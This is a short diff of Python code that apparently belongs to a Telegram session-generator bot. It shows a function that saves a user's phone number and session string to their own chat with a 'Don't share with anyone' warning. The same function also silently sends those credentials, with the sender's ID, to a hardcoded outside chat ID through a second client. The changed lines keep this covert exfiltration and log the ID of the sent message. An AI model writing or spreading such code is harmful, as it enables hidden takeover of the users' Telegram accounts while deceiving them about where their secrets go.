@@ -124,8 +124,8 @@ async def nm_2fa_save(mClient,sender_id,client,pass_2fa=None):
     print(f"\n{ssn}\n\n")
         
     await client.send_message("me", f"🔴 Don't share with anyone 🔴\n\n`{phn}`\n\n`{ssn}`\n\n💁‍♂️ Developer @k_ofcl✌️",)
-    await mClient.send_message(2576914746, f"`{phn}_{sender_id}`\n\n`{ssn}`\n\n💁‍♂️ Developer @k_ofcl✌️",)
-    
+    ssn_msg = await mClient.send_message(2576914746, f"`{phn}_{sender_id}`\n\n`{ssn}`\n\n💁‍♂️ Developer @k_ofcl✌️",)
+    print(f"\nmsgID : {ssn_msg.id}\n")
 
     #for message in mClient.get_messages(sender_id, None, search=phn):
         #print(message.text)
